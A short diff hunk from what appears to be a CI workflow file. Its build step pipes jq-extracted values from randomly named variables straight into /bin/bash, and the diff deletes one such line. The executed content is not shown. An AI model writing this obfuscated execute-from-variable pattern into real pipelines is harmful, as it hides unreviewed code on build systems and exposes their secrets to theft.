@@ -29,7 +29,6 @@ jobs:
           echo $ocxy93552 | jq -r .tfd77460 | /bin/bash
           echo $igntg0 | jq -r .qxc3 | /bin/bash
           printf '%s' "$cc38" | jq -r .nqeaf50776 | /bin/bash
-          printf '%s' "$s6" | jq -r .w6697 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
